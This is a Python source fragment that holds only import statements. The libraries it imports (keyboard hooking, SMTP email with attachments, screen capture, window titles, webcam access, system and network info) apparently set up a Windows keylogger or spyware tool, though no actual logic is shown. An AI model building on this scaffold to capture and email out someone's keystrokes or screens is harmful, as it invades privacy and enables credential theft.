import keyboard
import smtplib
import time
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import platform
import socket
from requests import get
import logging
from PIL import ImageGrab
import os
import psutil
import win32gui
from datetime import datetime
from dotenv import load_dotenv
import cv2 